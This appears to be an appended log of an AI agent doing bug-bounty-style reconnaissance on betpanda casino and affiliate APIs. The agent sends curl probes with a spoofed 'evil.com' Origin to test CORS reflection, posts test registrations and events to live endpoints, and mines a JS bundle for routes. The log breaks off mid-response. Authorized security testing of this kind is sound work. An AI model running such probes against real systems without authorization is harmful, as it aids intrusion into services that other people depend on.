@@ -10228,3 +10228,956 @@ testability: AUTH_HELPED
 
 **STEP 7 — RISK**
 [RISK] betpanda: 52 — Top finding (wildcard CORS+credentials on all of affiliates /rest/*, public + authed incl. register/login/config and money/AUTH routes) reconfirmed backend-wide with live no-auth CORS return reflecting arbitrary Origins; still POC-gated on one authenticated session (register/login primitives point the way). IDOR/BOLA on casino money-flow (JWT sub) and cable stored-XSS/poisoning parked as next tier. No surface change this cycle; program-wide value moderate-high, climbs once an authed credentialed cross-origin POC lands.
+===== ANALYST bigpickle 2026-09-05 17:34:36 UTC =====
+[0m
+> build · big-pickle
+[0m
+Let me check the current workspace state and run passive probes to continue the analysis.
+[0m✱ [0mGlob "**/*"[90m in . · 62 matches[0m
+[0m→ [0mRead state_bigpickle.json
+[0m→ [0mRead triage/run-2026-09-05-15-20.md
+[0m→ [0mRead reports/analyst-bigpickle.log[90m [offset=0, limit=100][0m
+Let me run current passive probes across the key assets to check for changes and expand the attack surface.
+[0m
+[0m$ [0mcurl -sI --max-time 10 https://betpanda.partners 2>&1 | head -20
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:25:23 GMT
+content-type: text/html; charset=utf-8
+cf-ray: a366eecedd9946f8-SJC
+cf-cache-status: DYNAMIC
+cache-control: no-store, no-cache, must-revalidate, max-age=0
+expires: 0
+last-modified: Thu, 03 Sep 2026 07:48:21 GMT
+server: cloudflare
+set-cookie: __cflb=02DiuDJtr6FDeA2benWyBfWMHoa2iyUHtSYXobu8Gzxzg; HttpOnly; SameSite=Lax; Path=/; Expires=Sun, 06 Sep 2026 16:25:23 GMT
+pragma: no-cache
+x-robots-tag: noindex, nofollow
+x-robots-tag: noindex, nofollow
+x-geo-time-debug: country=US blocked=false timeGated=false tz=America/Los_Angeles officeHours=false popup=false
+[0m
+[0m$ [0mcurl -sI --max-time 10 https://affiliates.betpanda.io 2>&1 | head -20
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:25:23 GMT
+content-type: text/html
+server: cloudflare
+last-modified: Thu, 30 Jul 2026 12:02:44 GMT
+accept-ranges: bytes
+cf-cache-status: DYNAMIC
+cf-ray: a366eed18cab60d0-SJC
+[0m
+[0m$ [0mcurl -s --max-time 10 https://cable.betpanda.io 2>&1
+██████╗ ██████╗      ██████╗ █████╗ ██████╗ ██╗     ███████╗    🔌
+██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██║     ██╔════╝    
+██████╔╝██████╔╝    ██║     ███████║██████╔╝██║     █████╗      
+██╔══██╗██╔═══╝     ██║     ██╔══██║██╔══██╗██║     ██╔══╝      
+██████╔╝██║         ╚██████╗██║  ██║██████╔╝███████╗███████╗    
+╚═════╝ ╚═╝          ╚═════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝    
+                                                                  
+           Service - Ready! 🚀
+[0m
+[0m$ [0mcurl -s --max-time 10 -X OPTIONS https://betpanda.partners/rest/user/settings -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: authorization" -D - -o /dev/null 2>&1
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:25:29 GMT
+content-length: 0
+cf-ray: a366eef34e298e6a-SJC
+cf-cache-status: DYNAMIC
+cache-control: no-cache, no-store, max-age=0, must-revalidate, must-revalidate
+expires: 0
+server: cloudflare
+set-cookie: __cflb=02DiuDJtr6FDeA2benWwuFiDuYDUWuNm6LA4URkYkZ2Tn; HttpOnly; SameSite=Lax; Path=/; Expires=Sun, 06 Sep 2026 16:25:29 GMT
+strict-transport-security: max-age=31536000 ; includeSubDomains
+vary: Origin
+pragma: no-cache
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-robots-tag: noindex, nofollow
+x-robots-tag: noindex, nofollow
+x-xss-protection: 0
+[0m
+[0m$ [0mcurl -s --max-time 10 -X OPTIONS https://betpanda.partners/rest/user/account-balances-and-bonuses -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: authorization,content-type" -D - -o /dev/null 2>&1
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:25:30 GMT
+content-length: 0
+cf-ray: a366eef92ff567ef-SJC
+cf-cache-status: DYNAMIC
+cache-control: no-cache, no-store, max-age=0, must-revalidate, must-revalidate
+expires: 0
+server: cloudflare
+set-cookie: __cflb=02DiuDJtr6FDeA2benWyBfWMHoa2iyUHtXiGSzqfetcRa; HttpOnly; SameSite=Lax; Path=/; Expires=Sun, 06 Sep 2026 16:25:30 GMT
+strict-transport-security: max-age=31536000 ; includeSubDomains
+vary: Origin
+pragma: no-cache
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-robots-tag: noindex, nofollow
+x-robots-tag: noindex, nofollow
+x-xss-protection: 0
+[0m
+[0m$ [0mcurl -s --max-time 10 https://betpanda.partners/rest/user/authenticate -H "Origin: https://evil.com" -D - -o /dev/null 2>&1
+HTTP/2 405 
+date: Sat, 05 Sep 2026 17:25:30 GMT
+content-type: application/json
+set-cookie: __cflb=02DiuDJtr6FDeA2benWyBfWMHoa2iyUHtXiGSzqfetcRa; HttpOnly; SameSite=Lax; Path=/; Expires=Sun, 06 Sep 2026 16:25:30 GMT
+set-cookie: _cfuvid=LHHR8nJoQkMW5vreM7UB47akWn7J5xxP8_6Z5HzF4HU-1788629129.7594185-1.0.1.1-cZlTjkYLQrt4NUMrhed1D9PLvLzsv3l6wOS5Yw5XWt0; HttpOnly; SameSite=None; Secure; Path=/; Domain=betpanda.partners
+cf-ray: a366eefcfcdb169a-SJC
+cf-cache-status: DYNAMIC
+allow: POST
+cache-control: no-cache, no-store, max-age=0, must-revalidate
+expires: 0
+server: cloudflare
+strict-transport-security: max-age=31536000 ; includeSubDomains
+vary: Origin
+pragma: no-cache
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-robots-tag: noindex, nofollow
+x-robots-tag: noindex, nofollow
+x-xss-protection: 0
+[0m
+[0m$ [0mcurl -s --max-time 10 https://betpanda.partners/rest/user/authenticate -H "Origin: https://evil.com" -D - -o /dev/null 2>&1 | grep -i "access-control\|vary"
+vary: Origin
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+[0m
+[0m$ [0mcurl -s --max-time 10 https://betpanda.partners/rest/properties/manifest -H "Origin: https://evil.com" -D - -o /dev/null 2>&1 | grep -i "access-control\|vary"
+vary: Origin
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+[0m
+Critical finding: betpanda.partners OPTIONS responses show NO `access-control-allow-origin` header. Let me verify if it reflects origin on actual requests.
+[0m$ [0mcurl -s --max-time 10 -X OPTIONS https://betpanda.partners/rest/public/config -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -D - -o /dev/null 2>&1 | grep -i "access-control\|vary"
+vary: Origin
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+[0m
+[0m$ [0mcurl -s --max-time 10 https://betpanda.partners/rest/public/config -D - -o /dev/null 2>&1 | head -20
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:25:54 GMT
+content-type: application/json
+cf-ray: a366ef92dca246f8-SJC
+cf-cache-status: DYNAMIC
+cache-control: no-cache, no-store, max-age=0, must-revalidate
+expires: 0
+server: cloudflare
+set-cookie: __cflb=02DiuDJtr6FDeA2benWyBfWMHoa2iyUHsCwDzwK1SJCk4; HttpOnly; SameSite=Lax; Path=/; Expires=Sun, 06 Sep 2026 16:25:54 GMT
+strict-transport-security: max-age=31536000 ; includeSubDomains
+vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
+pragma: no-cache
+access-control-allow-credentials: true
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-robots-tag: noindex, nofollow
+x-robots-tag: noindex, nofollow
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://betpanda.partners/rest/public/register -H "Content-Type: application/json" -d '{}' -D - 2>&1 | head -20
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:25:55 GMT
+content-type: application/json
+cf-ray: a366ef99bd0667ef-SJC
+cf-cache-status: DYNAMIC
+cache-control: no-cache, no-store, max-age=0, must-revalidate
+expires: 0
+server: cloudflare
+set-cookie: __cflb=02DiuDJtr6FDeA2benWyBfWMHoa2iyUHsDg3X8sf4ZsEU; HttpOnly; SameSite=Lax; Path=/; Expires=Sun, 06 Sep 2026 16:25:55 GMT
+strict-transport-security: max-age=31536000 ; includeSubDomains
+vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
+pragma: no-cache
+access-control-allow-credentials: true
+access-control-allow-headers: Authorization,content-type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin,x-maintenance-reason,x-captcha-token,x-preferred-app-context,x-site-name-id
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-expose-headers: x-maintenance-reason, x-site-name-id
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-robots-tag: noindex, nofollow
+x-robots-tag: noindex, nofollow
+[0m
+[0m$ [0mcurl -s --max-time 10 https://betpanda.partners/rest/user/settings -H "Origin: https://evil.com" -D - 2>&1 | head -5
+HTTP/2 401 
+date: Sat, 05 Sep 2026 17:25:56 GMT
+content-type: text/plain; charset=utf-8
+content-length: 32
+cf-ray: a366ef9e0d1f8e6a-SJC
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://affiliates.betpanda.io/rest/public/register -H "Content-Type: application/json" -H "Origin: https://evil.com" -d '{"email":"test@test.com","password":"Test1234!"}' -D - 2>&1 | head -30
+HTTP/2 400 
+date: Sat, 05 Sep 2026 17:26:05 GMT
+content-type: application/xml;charset=UTF-8
+access-control-allow-origin: https://evil.com
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366efda4cb272fa-SJC
+
+<Map><timestamp>1788629165691</timestamp><status>400</status><error>Bad Request</error><path>/rest/public/register</path></Map>
+[0m
+[0m$ [0mcurl -s --max-time 10 -X OPTIONS https://affiliates.betpanda.io/rest/public/register -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" -D - -o /dev/null 2>&1
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:26:05 GMT
+content-length: 0
+access-control-allow-origin: https://evil.com
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366efdd8b0e15a0-SJC
+[0m
+Important: betpanda.partners returns `access-control-allow-credentials: true` but NO `access-control-allow-origin` header — CORS is properly pinned (no reflection). The `/rest/public/*` routes return 404 (different from affiliates.betpanda.io). Let me now probe for new attack surface.
+[0m$ [0mcurl -s --max-time 10 https://cable.betpanda.io/cable/ -D - 2>&1 | head -20
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:26:06 GMT
+content-type: application/json
+content-length: 30
+server: cloudflare
+cf-cache-status: DYNAMIC
+cf-ray: a366efe07f007587-SJC
+
+{"error":"Cannot GET /cable/"}
+[0m
+Register endpoint confirmed alive — returns real Spring Boot XML 400 with **ACAO reflect + ACAC:true**. Let me examine the JS bundle to find the exact register/request format.
+[0m$ [0mcurl -s --max-time 10 https://affiliates.betpanda.io/ 2>&1 | grep -oP 'src="[^"]*\.js"' | head -20
+src="/main.ef021e68.js"
+[0m
+[0m$ [0mcurl -s --max-time 10 https://affiliates.betpanda.io/config/config.json -D - 2>&1
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:26:21 GMT
+content-type: application/json
+content-length: 56
+server: cloudflare
+last-modified: Thu, 03 Sep 2026 07:48:07 GMT
+etag: "6a992637-38"
+accept-ranges: bytes
+cf-cache-status: DYNAMIC
+cf-ray: a366f03caf7fee01-SJC
+
+{
+  "baseUrl" : "https://affiliates.betpanda.io/rest"
+}
+[0m
+[0m$ [0mcurl -s --max-time 15 https://affiliates.betpanda.io/main.ef021e68.js -o /tmp/opencode/main.js 2>&1 && wc -c /tmp/opencode/main.js
+2089581 /tmp/opencode/main.js
+[0m
+[0m$ [0mgrep -oP '"/rest/[^"]*"' /tmp/opencode/main.js | sort -u
+(no output)
+[0m
+[0m$ [0mgrep -oP '`/?rest/[^`]*`' /tmp/opencode/main.js | sort -u | head -50
+(no output)
+[0m
+[0m$ [0mgrep -oP 'rest/public/[a-zA-Z0-9_/\-{}]*' /tmp/opencode/main.js | sort -u
+(no output)
+[0m
+[0m$ [0mgrep -oP '(register|recover-password|login|public)[^",\x27]{0,40}' /tmp/opencode/main.js | grep -i "public\|register\|recover" | sort -u | head -40
+public.s3-eu-west-1.amazonaws.com/neobet/neobe
+public/config
+public/login
+public/logout
+public/recover-password/email/${e}`)}catch(t){
+public/register
+publicMethods.indexOf(l)!==-1){for(var m=argum
+publicMethods=[
+public\/phone\/(register|signin)\/verify$/
+register
+register&&!ee.keepDefaultValue&&kr(a
+register&&i&&r.register(a)
+register&&r.deregister(i))}safeToRemove(){const{
+register(e.label)
+register(n
+register(n):p(n
+register-btn
+register:Ee
+register:M
+register:c
+register:c(
+register:d
+register:e
+register:i}=e
+register:je
+register:n
+register:p=>(c.set(p
+register:r}=e
+register:s
+register:s(
+register:t}=this.node.presenceContext||{};t&&(th
+register:u
+register:u(
+register:v
+register?dt(a
+register?ee.keepDefaultValues?Ss(a):{}:be
+register?{}:Ss(a)
+registerPrevious(this)}
+registerPrevious:function(s){if(this.isLocked)th
+registerPrevious=function(w){this._sources.push(
+[0m
+[0m$ [0mgrep -oP '.{200}publicMethods.{200}' /tmp/opencode/main.js | head -5
+,saveAspectRatio:!1}}).call(this)}(),window.Apex===void 0&&(window.Apex={});var B3=function(){function ne(o){a(this,ne),this.ctx=o,this.w=o.w}return c(ne,[{key:"initModules",value:function(){this.ctx.publicMethods=["updateOptions","updateSeries","appendData","appendSeries","toggleSeries","showSeries","hideSeries","setLocale","resetSeries","zoomX","toggleDataPointSelection","dataURI","exportToCSV","addXaxisAnno
+),l=0;l<o.length;l++)new ne(o[l],JSON.parse(o[l].getAttribute("data-options"))).render()}},{key:"exec",value:function(o,l){var f=this.getChartByID(o);if(f){f.w.globals.isExecCalled=!0;var h=null;if(f.publicMethods.indexOf(l)!==-1){for(var m=arguments.length,g=new Array(m>2?m-2:0),b=2;b<m;b++)g[b-2]=arguments[b];h=f[l].apply(f,g)}return h}}},{key:"merge",value:function(o,l){return S.extend(o,l)}}]),ne}();e.expo
+[0m
+[0m$ [0mgrep -oP '.{150}/rest/public.{250}' /tmp/opencode/main.js | head -5
+(no output)
+[0m
+[0m$ [0mgrep -oP '.{100}"public/login.{200}' /tmp/opencode/main.js | head -3
+(no output)
+[0m
+[0m$ [0mgrep -oP '.{120}public/register.{200}' /tmp/opencode/main.js | head -3
+=null?void 0:t.error,{cause:(n=r==null?void 0:r.data)==null?void 0:n.status})}},COe=async e=>{try{return Vt.post(Yt()+"/public/register",e)}catch(t){throw new Error(t)}},OOe=async e=>{try{return Vt.post(Yt()+"/public/login",e)}catch(t){throw new Error(t)}},VM=async()=>{try{return Vt.get(Yt()+"/user")}catch(e){throw new Error(e)}},W0e
+[0m
+[0m$ [0mgrep -oP 'Yt=\(\)=>.{0,80}' /tmp/opencode/main.js | head -3; grep -oP 'function Yt.{0,80}' /tmp/opencode/main.js | head -3
+Yt=()=>M_.baseUrl,tG=()=>M_.favicon,nG=async e=>{try{return e.withDeposit?await Vt.post
+[0m
+[0m$ [0mgrep -oP 'public/login.{0,200}' /tmp/opencode/main.js | grep -oP '(params|body|username|email|password)[^,]*,?' | sort -u | head; grep -oP 'OOe.{0,300}' /tmp/opencode/main.js | head -3
+OOe=async e=>{try{return Vt.post(Yt()+"/public/login",e)}catch(t){throw new Error(t)}},VM=async()=>{try{return Vt.get(Yt()+"/user")}catch(e){throw new Error(e)}},W0e=()=>{try{return Vt.get(Yt()+"/public/logout")}catch(e){throw new Error(e)}},AOe=e=>{try{return Vt.get(Yt()+`/public/recover-password/emai
+OOe as l,COe as m,rn as n,_Oe as o,er as p,Vt as q,$ as r,Yt as s,Ev as t,Ui as u,POe as v,Qs as w,fH as x,Nn as y,Kn as z};
+[0m
+[0m$ [0mgrep -oP '.{0,250}password.{0,100}"recover-password".{0,300}' /tmp/opencode/main.js | head -3; grep -oP 'recover-password.{0,200}' /tmp/opencode/main.js | head -5
+recover-password/email/${e}`)}catch(t){throw new Error(t)}},POe=e=>{try{return Vt.post(Yt()+"/user/password/reset",e)}catch(t){throw new Error(t)}},Y0e=e=>{let t=e;const n=Ui(),r=async()=>{try{await U0e({verification
+[0m
+[0m$ [0mgrep -oP 'COe\(.{0,300}' /tmp/opencode/main.js | head -5
+(no output)
+[0m
+[0m$ [0mgrep -oP 'COe.{0,50}' /tmp/opencode/main.js | sort -u | grep -oP '\w+:{[^}]+}' | head -20
+(no output)
+[0m
+[0m$ [0mgrep -oP 'COe' /tmp/opencode/main.js | wc -l
+2
+[0m
+[0m$ [0mgrep -oP '.{0,80}\bCOe\b.{0,200}' /tmp/opencode/main.js | head -10
+=null?void 0:t.error,{cause:(n=r==null?void 0:r.data)==null?void 0:n.status})}},COe=async e=>{try{return Vt.post(Yt()+"/public/register",e)}catch(t){throw new Error(t)}},OOe=async e=>{try{return Vt.post(Yt()+"/public/login",e)}catch(t){throw new Error(t)}},VM=async()=>{try{return Vt
+as c,Ec as d,pc as e,Wo as f,Uge as g,VM as h,TOe as i,y as j,Wge as k,OOe as l,COe as m,rn as n,_Oe as o,er as p,Vt as q,$ as r,Yt as s,Ev as t,Ui as u,POe as v,Qs as w,fH as x,Nn as y,Kn as z};
+[0m
+[0m$ [0mgrep -oP '.{0,150}(register-with-email|signup|captchaToken|captcha_token|x-captcha).{0,250}' /tmp/opencode/main.js | head -10
+ull&&(r=[]),r.map(i=>{n.sheet.data.push([{value:He(i.date).format("YYYY-MM-DD HH:mm:ss"),type:"string"},{value:i.uniqueClicks,type:"string"},{value:i.signups,type:"string"},{value:i.depositingPlayers,type:"string"},{value:i.activePlayers,type:"string"},{value:i.newDepositingPlayers,type:"string"},{value:i.depositSum,type:"string"},{value:i.netRevenue,type:"string"},{value:i.ggr,type:"string"},{value:i.c
+),[i,a]=$.useState({value:"",active:!1}),[s,c]=$.useState(void 0),{t:u}=Ot();$.useEffect(()=>{b0e().then(S=>{r({deposits:S.newFirstDepositCallbackUrl,signups:S.newSignupCallbackUrl});const P=Ox(S.newSignupCallbackUrl),M=Ox(S.newFirstDepositCallbackUrl),j=Cx(S.newSignupCallbackUrl),B=Ax(S.newSignupCallbackUrl),W=Cx(S.newFirstDepositCallbackUrl),q=Ax(S.newFirstDepositCallbackUrl);e(K=>({...K,signups:{url:
+be()},[p]);const E=S=>{navigator.clipboard.writeText(x(S)),a({value:S,active:!0}),setTimeout(()=>{a({value:"",active:!1})},1500)};function T(S){const{signups:P,deposits:M}=S;let j=!1;if(P&&!/^(https?:\/\/)/i.test(P)&&(j=!0,w("signups",{message:"Invalid Url"})),M&&!/^(https?:\/\/)/i.test(M)&&(j=!0,w("deposits",{message:"Invalid Url"})),!j){const B={};B.newSignupCallbackUrl=P,B.newFirstDepositCallbackUrl=
+3",onSubmit:v(T),children:[y.jsxs("div",{className:"form-group",children:[y.jsx("label",{className:"form-check-label pb-2 p-1 text-gray-600",htmlFor:"signups",children:u("callbackpage.settings.signups-field.label")}),y.jsxs("div",{className:"d-flex gap-2 position-relative",children:[y.jsx("input",{...d("signups",{maxLength:{value:1e3,message:u("accountpage.payout.errors.limit")}}),type:"text",className:
+`form-control pe-13 ${k.signups?"is-invalid":""}`,id:"signups","aria-describedby":"Signup Callback URL",placeholder:u("callbackpage.settings.signups-field.placeholder")}),y.jsx(Pk,{info:i.value==="signups"&&i.active?"Copied":"Copy",children:y.jsx("span",{id:"copyButton",className:"custom-clipboard-btn ",title:"Click to copy",onClick:()=>{E("signups")},children:y.jsx("i",{className:"bi bi-clipbo
+ard fs-5 p-0 m-0","aria-hidden":"true"})})})]})]}),k.signups&&(k==null?void 0:k.signups)&&y.jsx("span",{className:"text-danger px-2 py-2",children:(O=k.signups)==null?void 0:O.message}),y.jsxs("div",{className:"form-group mt-5",children:[y.jsx("label",{className:"form-check-label pb-2 p-1 text-gray-600",htmlFor:"deposits",children:u("
+,country:"en",currency:"eur",amount:"10.00",amountEuro:"10.00"},R0e=e=>{const{t}=Ot(),[n,r]=$.useState(void 0),[i,a]=$.useState(!1),[s,c]=$.useState("signups"),[u,d]=$.useState(null),p=j=>c(j.target.id),{register:v,watch:x,reset:w,handleSubmit:k,getValues:E}=Ec({values:QT});$.useEffect(()=>{e.callbackUrls.deposits.sourceUrl&&e.callbackUrls.signups.sourceUrl||e.callbackUrls.signups.sourceUrl?c("signups")
+:e.callbackUrls.deposits.sourceUrl&&c("deposits")},[e]),$.useEffect(()=>{w()},[s]);const T=[{option:"signups",url:e.callbackUrls.signups.sourceUrl},{option:"deposits",url:e.callbackUrls.deposits.sourceUrl}],O=new URLSearchParams,S=new URLSearchParams;$.useEffect(()=>{d($e.idle);const j=x((B,{name:W})=>{Object.entries(B).forEach(([q,K])=>{if(Object.keys(e.callbackUrls[s].source).incl
+",children:[y.jsxs("b",{className:"text-gray-700 fs-5",children:[e("callbackpage.instructions.exampleTitle"),": "]}),"https://epicdomain.com/callback/signup?click_id={clickId}&tracker={tracker}"]})}),y.jsx("div",{className:"separator separator-dashed mt-9 mb-5"}),y.jsx("div",{className:"mt-5",children:y.jsxs("div",{style:{width:"fit-content"},className:"m-0 ",children:[y.jsxs("div",{style:{width:"fit-co
+uto"},exit:{height:0},transition:{duration:.3},children:y.jsx("div",{children:e})})}),M0e=()=>{const{t:e}=Ot(),[t,n]=$.useState(!1),[r,i]=$.useState({signups:{url:"",params:[],source:{},sourceUrl:""},deposits:{url:"",params:[],source:{},sourceUrl:""}}),a=()=>{n(s=>!s)};return y.jsxs(ti,{mb:"450px",children:[y.jsx(Hi,{title:e("callbackpage.page-title"),seaction:e("callbackpage.page-subtitle")}),y.jsx(L0e
+[0m
+[0m$ [0mgrep -oP 'public\\/phone\\/\\(register\|signin\\)\\/verify\$/' /tmp/opencode/main.js; grep -oP '.{0,120}public/.{0,120}' /tmp/opencode/main.js | grep -oiP 'phone|verify|otp|code' | sort -u | head -20
+(no output)
+[0m
+[0m$ [0mgrep -oP 'verify\$/,{0,10}"[^"]*"' /tmp/opencode/main.js | head; grep -oP 'recover[^"]{0,120}(email|password|token|code)[^"]{0,60}"' /tmp/opencode/main.js | sort -u | head -20
+(no output)
+[0m
+[0m$ [0mgrep -oP 'recover-password[^"]{0,80}' /tmp/opencode/main.js | sort -u | head -10
+recover-password/email/${e}`)}catch(t){throw new Error(t)}},POe=e=>{try{return Vt.post(Yt()+
+[0m
+[0m$ [0mgrep -oP 'public[\\/][a-zA-Z0-9_\-/{}$]{0,60}' /tmp/opencode/main.js | sort -u | head -30
+public/config
+public/login
+public/logout
+public/recover-password/email/${e}
+public/register
+public\/phone
+[0m
+[0m$ [0mgrep -oP '.{0,300}public\\/phone.{0,500}' /tmp/opencode/main.js | head -5
+withCredentials:!0,headers:{"Content-type":"application/json"}});Vt.interceptors.request.use(e=>{const{data:t}=e;if(t&&JSON.stringify(t).length>1e3)throw new Error("Request body size exceeds limit");return e});Vt.interceptors.response.use(e=>{var n;const t=e.config.url;return e.status===200&&(N1(/\/public\/phone\/(register|signin)\/verify$/,t)?((n=e.data)==null?void 0:n.status)==="OK"&&localStorage.setItem(0 .toString(),1 .toString()):N1(/\/login$/,t)&&localStorage.setItem(0 .toString(),1 .toString())),N1(/logout/,t)&&e.status===200&&localStorage.setItem(0 .toString(),2 .toString()),e.data},e=>{var r,i,a,s;(((r=e==null?void 0:e.response)==null?void 0:r.status)===401||((i=e==null?void 0:e.response)==null?void 0:i.status)===403)&&localStorage.setItem(0 .toString(),2 .toString());const t=((a=e==null?void
+[0m
+[0m$ [0mgrep -oP '"public/phone[^"]*"' /tmp/opencode/main.js | sort -u; grep -oP 'public/phone[^`"]{0,70}' /tmp/opencode/main.js | sort -u | head -20
+(no output)
+[0m
+[0m$ [0mgrep -oP 'phone[^`"]{0,30}verify[^`"]{0,30}' /tmp/opencode/main.js | sort -u | head
+phone\/(register|signin)\/verify$/,t)?((n=e.data)==null?void 0
+[0m
+[0m$ [0mgrep -oP '"[^"]*phone[^"]*"' /tmp/opencode/main.js | sort -u | head -20
+");return e});Vt.interceptors.response.use(e=>{var n;const t=e.config.url;return e.status===200&&(N1(/\/public\/phone\/(register|signin)\/verify$/,t)?((n=e.data)==null?void 0:n.status)==="
+",children:t&&t.user.email?No(t.user.email):t.user.contactIm})]})}),t.user.phoneNumber&&y.jsx("
+",children:t.user.phoneNumber})]})}),y.jsx("
+":2,speaker:3,printer:5,simcard:5,router:2,phone:2,"
+"accountpage.profile.phoneNumber"
+"phone"
+"telephone-geolocation"
+[0m
+[0m$ [0mgrep -oP 'phone[^a-zA-Z0-9]{0,5}(register|signin|verify|code|confirm)[^a-zA-Z0-9]{0,40}' /tmp/opencode/main.js | sort -u | head -30
+phone\/(register|
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"event_type":"test_event","user_id":"test","data":"probe"}' -D - 2>&1 | head -20
+HTTP/2 400 
+date: Sat, 05 Sep 2026 17:27:21 GMT
+content-type: application/json
+content-length: 60
+server: cloudflare
+cf-cache-status: DYNAMIC
+cf-ray: a366f1b74bf5f9ea-SJC
+
+{"error":"userId must contain only alphanumeric characters"}
+[0m
+Let me re-verify and probe the cable.betpanda.io event endpoint for accepted fields and potential reflection/storage.
+[0m$ [0mcurl -s --max-time 10 -X GET https://cable.betpanda.io/cable/user-event -D - 2>&1 | head -15; echo "---"; curl -s --max-time 10 -X OPTIONS https://cable.betpanda.io/cable/user-event -H "Origin: https://evil.com" -D - -o /dev/null 2>&1 | head -15
+HTTP/2 405 
+date: Sat, 05 Sep 2026 17:27:23 GMT
+content-type: application/json
+content-length: 30
+server: cloudflare
+allow: POST
+cf-cache-status: DYNAMIC
+cf-ray: a366f1be1f04ed38-SJC
+
+{"error":"Method Not Allowed"}---
+HTTP/2 405 
+date: Sat, 05 Sep 2026 17:27:23 GMT
+content-type: application/json
+content-length: 30
+server: cloudflare
+vary: Origin
+allow: POST
+cf-cache-status: DYNAMIC
+cf-ray: a366f1c16bbcce54-SJC
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"eventType":"deposit","userId":"test123","amount":100}' -D - 2>&1 | head -20
+HTTP/2 400 
+date: Sat, 05 Sep 2026 17:27:27 GMT
+content-type: application/json
+content-length: 56
+server: cloudflare
+cf-cache-status: DYNAMIC
+cf-ray: a366f1dade6f3354-SJC
+
